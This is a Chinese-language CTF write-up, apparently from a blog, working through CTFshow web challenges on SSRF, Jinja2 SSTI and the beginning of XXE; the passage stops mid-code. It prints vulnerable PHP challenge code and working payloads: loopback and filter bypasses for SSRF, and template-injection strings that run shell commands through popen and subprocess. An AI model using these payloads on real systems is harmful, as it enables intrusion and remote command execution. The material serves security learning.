<li><strong><code>curl_exec</code> 函数的作用及使用场景</strong><br><code>curl_exec</code> 是 PHP cURL 库中用于执行预配置的 cURL 会话的函数。它会发起网络请求（如 HTTP、FTP 等）并获取响应数据。在正常开发中，<code>curl_exec</code> 常用于以下场景：<ul>
<li>调用第三方 API（如支付接口、社交媒体平台）。</li>
<li>爬取网页内容或聚合数据。</li>
<li>下载远程文件（如图片、文档）。</li>
<li>实现服务间通信（如微服务架构中的内部调用）。</li>
</ul>
</li>
<li><strong>前三个 Payload 生效的原因</strong><br>前三个 Payload 利用的是 <strong>SSRF（服务端请求伪造）</strong>，使服务器向自身发起请求：<ul>
<li><code>url=http://127.0.0.1/flag.php</code> 与 <code>url=http://localhost/flag.php</code>：<br><code>127.0.0.1</code> 和 <code>localhost</code> 均指向服务器本地。若 <code>flag.php</code> 部署在服务器的 Web 根目录（如 <code>/var/www/html/</code>）且仅允许本地访问，通过 cURL 请求这些地址可直接读取文件内容。</li>
<li><strong>注意</strong>：若 Payload 中未显式包含协议（如 <code>http://</code>），cURL 可能默认补全或报错，实际测试时需确保 URL 格式正确（如 <code>http://127.0.0.1/flag.php</code>）。</li>
</ul>
</li>
<li><strong><code>file://</code> 协议绕过本地限制的原因</strong><br>Payload <code>url=file:///var/www/html/flag.php</code> 生效的关键点：<ul>
<li><strong>直接文件系统访问</strong>：<code>file://</code> 协议允许 cURL 直接读取服务器本地文件，无需经过 HTTP 服务。若代码未限制协议类型（默认允许所有协议），攻击者可绕过网络层限制（如防火墙、IP 黑名单）。</li>
<li><strong>防御缺失</strong>：若服务器未禁用危险协议（如通过 <code>CURLOPT_PROTOCOLS</code> 限制仅允许 HTTP&#x2F;HTTPS），<code>file://</code> 可被利用读取敏感文件（如 <code>/etc/passwd</code>）。</li>
</ul>
</li>
</ol>
<h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123; </span><br><span class="line">    #仅允许 http:// 或 https:// 协议，阻止 file://、gopher:// 等危险协议</span><br><span class="line">if(! preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;</span><br><span class="line">    #检测 URL 中是否包含 localhost 或 127.0.0，若匹配则终止并返回 &quot;hacker&quot;。</span><br><span class="line">    #这里的 localhost 和 127.0.0 真的被过滤了吗？preg_match 函数的参数都没给完整，其限制字符就是个幌子</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; hacker</span><br></pre></td></tr></table></figure>


<p><strong>漏洞分析</strong></p>
<ol>
<li><strong>正则表达式缺陷</strong></li>
</ol>
<ul>
<li><strong>范围不完整</strong>：正则仅检测 <code>127.0.0</code>，但未覆盖以下情况：<ul>
<li>IPv4 短格式：<code>http://127.1/</code>（等价于 <code>127.0.0.1</code>）。</li>
<li>十进制 IP：<code>http://2130706433/</code>（对应 <code>127.0.0.1</code>）。</li>
<li><del>IPv6 地址：<code>http://[::1]/</code>（对应 <code>localhost</code>）。</del></li>
</ul>
</li>
<li><del><strong>大小写绕过</strong>：未使用 <code>i</code> 修饰符，<code>LocalHost</code> 或 <code>LOCALHOST</code> 可绕过检测。</del></li>
</ul>
<ol start="2">
<li><strong><code>parse_url</code> 解析绕过</strong></li>
</ol>
<ul>
<li><strong>URL 混淆攻击</strong>：<br>构造 <code>http://evil.com@127.0.0.1/</code>，<code>parse_url</code> 解析的 <code>host</code> 为 <code>evil.com</code>，但实际请求发送到 <code>127.0.0.1</code>。</li>
<li><strong>路径注入</strong>：<br><code>http://example.com/127.0.0.1/flag.php</code>，正则触发误杀合法 URL，但攻击者仍可能利用其他格式。</li>
</ul>
<p><strong>攻击示例</strong></p>
<p>绕过黑名单的 Payload：</p>
<ol>
<li><p><strong>IPv4 短格式</strong></p>
<p>复制</p>
<p>url &#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p>
<ul>
<li>等价于 <code>127.0.0.1</code>，但绕过正则检测。</li>
</ul>
</li>
<li><p><strong>十进制 IP</strong></p>
<p>复制</p>
<p>url &#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a></p>
<ul>
<li>十进制 <code>2130706433</code> 对应 <code>127.0.0.1</code>。</li>
</ul>
</li>
<li><p><del><strong>IPv6 地址</strong></del></p>
<p><del>复制</del></p>
<p>url &#x3D; http:&#x2F;&#x2F;[:: 1]&#x2F;flag.php</p>
<ul>
<li><del>IPv6 的本地回环地址，未被正则覆盖。</del></li>
</ul>
</li>
</ol>
<blockquote>
<p>各种进制的 IP 地址</p>
<p>#默认</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
<p>#16 进制</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0x7F000001</a></p>
</blockquote>
<blockquote>
<p>#10 进制</p>
</blockquote>
<blockquote>
<p>((127 <em>256+0)</em> 256+0)*256+1&#x2F;&#x2F;计算过程<br><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://2130706433</a></p>
</blockquote>
<blockquote>
<p>#8 进制</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0177.0000.0000.0001</a></p>
</blockquote>
<blockquote>
<p>题目使用 parse_url 对 url 进行解析，需要我们传入协议为 http 或者是 https，同时不可以出现 localhost 或者是 127.0.0 绕过: 使用其余各种指向 127.0.0.1 的地址 &gt;&gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.00000.00000.001/</a> 0 的数量多一点少一点都没影响，最后还是会指向 127.0.0.1 &gt;&gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1</a> &gt;&gt;&gt;&gt; 利用进制绕过……………… payload：url &#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.00000.00000.001/flag.php</a> 或者 <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p>
</blockquote>
<blockquote>
<p>前面的解析都没有认真思考</p>
<p>这里的 localhost 和 127.0.0 真的被过滤了吗？</p>
<p>preg_match 函数的参数都没给完整，其限制字符就是个幌子</p>
<p>直接 <code>url=http://localhost/flag.php</code> 照样拿下</p>
</blockquote>
<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><p>payload 直接拿上面那题的…</p>
<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">if(! preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; hacker</span><br></pre></td></tr></table></figure>





<blockquote>
<p>通过 ip 地址解析为 127.0.0.1 的网站进行绕过</p>
<p><code>url=http://spoofed.burpcollaborator.net/flag.php</code></p>
<p><code>url=http://safe.taobao.com/flag.php</code></p>
<p><code>url=http://sudo.cc/flag.php </code>; A 记录 sudo.cc 指向 IP 地址 127.0.0.1。</p>
</blockquote>
<h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$ x [&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;= 5))&#123;</span><br><span class="line">    #限制访问的域名长度</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; hacker</span><br></pre></td></tr></table></figure>

<p><code>url=http://127.1/flag.php</code></p>
<p>linux 中 0 指向本机地址</p>
<p>payload： <code>url=http://0/flag.php</code></p>
<h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$ x [&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;= 3))&#123;</span><br><span class="line">    #继续限制</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; hacker</span><br></pre></td></tr></table></figure>

<p>代码块</p>
<p><code>url=http://0/flag.php</code></p>
<h3 id="未复现-web357"><a href="#未复现-web357" class="headerlink" title="(未复现)web357"></a>(未复现)web357</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$ip = gethostbyname($ x [&#x27;host&#x27;]); </span><br><span class="line">echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br &gt;&#x27;;</span><br><span class="line">if(! filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    die(&#x27;ip!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo file_get_contents($_POST[&#x27;url&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;scheme&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; scheme</span><br></pre></td></tr></table></figure>




<blockquote>
<p><code>filter_var</code> 函数来验证 IP 地址的有效性，并且排除了私有 IP 范围（0.0.0.0&#x2F;8、172.16.0.0&#x2F;12 和 192.168.0.0&#x2F;16）和保留 IP 范围(0.0.0.0&#x2F;8 和 169.254.0.0&#x2F;16。)。<br>用 DNS rebind 进行 DNS 重绑定攻击，思路：第一次访问，域名第一次解析是 127.0.0.1，第二次解析是 104.56.61.24。第二次访问的时候，域名第一次解析是 104.56.61.24，第二次解析是 127.0.0.1。</p>
<p>用 <a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">DNS rebind</a> 进行 DNS 重绑定攻击，<strong>思路：第一次访问，域名第一次解析是 127.0.0.1，第二次解析是 104.56.61.24。第二次访问的时候，域名第一次解析是 104.56.61.24，第二次解析是 127.0.0.1。</strong></p>
</blockquote>
<blockquote>
<p><code>gethostbyname()</code> 是 PHP 中的一个函数，用于获取指定主机名的 IP 地址。这个函数可以通过给定主机名，返回相应主机的 IPv4 地址。如果主机名无效，则函数返回主机名本身</p>
<p>在 PHP 中，filter_var()函数结合 FILTER_VALIDATE_IP 过滤器可以用来验证一个 IP 地址的有效性。在这个例子中，FILTER_FLAG_NO_PRIV_RANGE 和 FILTER_FLAG_NO_RES_RANGE 是额外的标志，用于指定不接受私有 IP 地址和保留 IP 地址。</p>
<p>FILTER_VALIDATE_IP：指定要验证的过滤器类型，用于验证 IP 地址。<br>FILTER_FLAG_NO_PRIV_RANGE：指示 filter_var()函数不接受私有 IP 地址。私有 IP 地址范围包括：<br>10.0.0.0 至 10.255.255.255<br>172.16.0.0 至 172.31.255.255<br>192.168.0.0 至 192.168.255.255<br>FILTER_FLAG_NO_RES_RANGE：指示 filter_var()函数不接受保留 IP 地址。保留 IP 地址范围包括：<br>0.0.0.0 至 0.255.255.255<br>169.254.0.0 至 169.254.255.255<br>127.0.0.0 至 127.255.255.255<br>224.0.0.0 至 239.255.255.255<br>利用 302 重定向访问 127.0.0.1 的原理获得 flag 绕过过滤</p>
<p>302 重定向是 HTTP 状态代码之一，表示临时性的重定向。当服务器收到客户端的请求后，如果需要将请求的资源临时重定向到另一个 URL，但未来可能会恢复到原始 URL 时，就会返回 302 状态码。这意味着客户端应该继续使用原始 URL 进行后续请求，因为重定向是暂时的。302 重定向常用于网站维护、临时性更改或者流量控制等场景。</p>
</blockquote>
<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123;</span><br><span class="line">    echo file_get_contents($url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>url=http://ctf.:passwd@127.0.0.1/flag.php#show</code></p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><p>![img](file:&#x2F;&#x2F;&#x2F;C:\Users\111\Documents\Tencent Files\2645958615\nt_qq\nt_data\Pic\2025-04\Ori\250ea6921f44142c235ad251ca163526.png)</p>
<h3 id="web362-过滤部分数字"><a href="#web362-过滤部分数字" class="headerlink" title="web362 过滤部分数字"></a>web362 过滤部分数字</h3><p>这个题是屏蔽了数字 2 和 3，那么思路可以分为两类，硬要用 os 类那就绕过 2 和 3，或者用其他的类。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[11*11%2b+11].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat+/flag&#x27;).read()&#125;&#125;</span><br><span class="line">用&lt;class &#x27;warnings.catch_warnings&#x27;&gt;  执行命令：</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">用 subprocess.Popen()：</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[407](&quot;cat /flag&quot;,shell=True,stdout=-1).communicate()[0]&#125;&#125;</span><br><span class="line">使用_frozen_importlib_external.FileLoader 进行读取 flag 内容：</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[94].get_data(0,&#x27;/flag&#x27;)&#125;&#125;</span><br><span class="line">                                                         文件路径</span><br><span class="line">使用 lipsum 方法。这个是 flask 的内置方法，自带 os 模块：             </span><br><span class="line">&#123;&#123;lipsum.__globals__.get(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web363-单双引号””‘’"><a href="#web363-单双引号””‘’" class="headerlink" title="web363 单双引号””‘’"></a>web363 单双引号””‘’</h3><p>过滤了单引号，把””变成（）,用 request.args.a</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[11*11%2b+11].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>

<h3 id="web364-args"><a href="#web364-args" class="headerlink" title="web364 args"></a>web364 args</h3><p>过滤 args，可以用 cookies</p>
<blockquote>
<p>过滤 args，可以用 cookies<br><code>?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.cookies.p](request.cookies.param).read()&#125;&#125;</code><br>cookies<br><code>Cookie: p=popen; param=cat /flag</code></p>
</blockquote>
<p>request.values.a 读取 get&#x2F;post 方式里 a 的值</p>
<p>request.args.a 读取 get 方式里 a 的值</p>
<p>request.form.a 读取 post 方式里 a 的值</p>
<p>request.cookies.a 读取 cookie 里 a 的值</p>
<h3 id="web365-方括号"><a href="#web365-方括号" class="headerlink" title="web365 方括号[]"></a>web365 方括号[]</h3><blockquote>
<p>过滤了方括号，可以用__getitem__绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure></blockquote>
<blockquote>
<p>三种方法，但都需要用到 python 魔术方法 getitem</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方法一：&#123;%set char=config.**class**.**init**.**globals**.**builtins**.chr%&#125;&#123;&#123;().**class**.**base**.**subclasses**().**getitem**(132).**init**.**globals**.popen(char(108)%2bchar(115)).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">方法二： name=&#123;&#123;().class.base.subclasses().getitem(132).init.globals.getitem(request.cookies.x1)(request.cookies.x2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">然后将 cookie 写入 Cookie: x1=popen; x2=cat /flag</span><br><span class="line"></span><br><span class="line">方法三： 使用 subprocess.Popen 类 &#123;&#123;().**class**.**mro**.**getitem**(1).**subclasses**().**getitem**(407)(request.values.a,shell=True,stdout=-1).communicate().**getitem**(0)&#125;&#125;&amp;a=cat /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>
<h3 id="web366-下划线"><a href="#web366-下划线" class="headerlink" title="web366 下划线_"></a>web366 下划线_</h3><blockquote>
<p>过滤了下划线，先换一个更简单获取 popen 方法的类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.a).read()&#125;&#125;&amp;a =cat /flag</span><br></pre></td></tr></table></figure>

<p>再利用 filters 中的 attr 来过滤下划</p>
<p>具体介绍可以看一下官方文档 <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/#attr">https://jinja.palletsprojects.com/en/2.11.x/templates/#attr</a></p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure></blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在 `?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__` 这个恶意 payload 里：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`lipsum` 是一个对象，`request.values.b` 的值为 `&quot;__globals__&quot;` ，`attr(request.values.b)` （等价于 `attr(&quot;__globals__&quot;)` ）表示通过 `attr` 操作（类似 `getattr` 函数）去获取 `lipsum` 对象的 `__globals__` 属性。这里的 `|` 是模板引擎（比如 Jinja2 模板引擎）里的过滤器操作符，`lipsum | attr(request.values.b)` 就是对 `lipsum` 对象应用 `attr` 过滤器（本质是调用类似 `getattr` 这样获取属性的操作）来得到 `lipsum` 对象的 `__globals__` 属性值，它是一个包含了全局变量的字典。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后 `(lipsum | attr(request.values.b)).os` 是从这个 `__globals__` 字典里取出 `os` 模块对象（因为 `os` 模块通常会被包含在 `__globals__` 里） ，接着 `(lipsum | attr(request.values.b)).os.popen(request.values.a)` 调用 `os` 模块的 `popen` 函数去执行 `request.values.a` 所传入的命令（这里是 `cat /flag` ），最后 `.read()` 读取命令执行的输出结果。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`__globals__` 是 Python 中对象的一个特殊属性（属性名是固定的 `__globals__` ），而 `globals` 是 Python 内置函数，功能是返回当前全局符号表的字典。两者概念不同，并且在这个恶意 payload 里主要是获取对象的 `__globals__` 属性来达到恶意利用 `os` 模块执行命令的目的。</span><br></pre></td></tr></table></figure>



<h3 id="web367-os"><a href="#web367-os" class="headerlink" title="web367 os"></a>web367 os</h3><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了 os，可以通过 get 来获取</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="web368-request"><a href="#web368-request" class="headerlink" title="web368 request"></a>web368 request</h3><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了 request，但是是再&#123;&#123;&#125;&#125;中过滤了 request，没有在&#123;% %&#125;过滤 request</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="web369-request"><a href="#web369-request" class="headerlink" title="web369 request"></a>web369 request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="comment"># php://input 是 PHP 中用于直接读取 HTTP 请求体（Request Body） 的流。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span 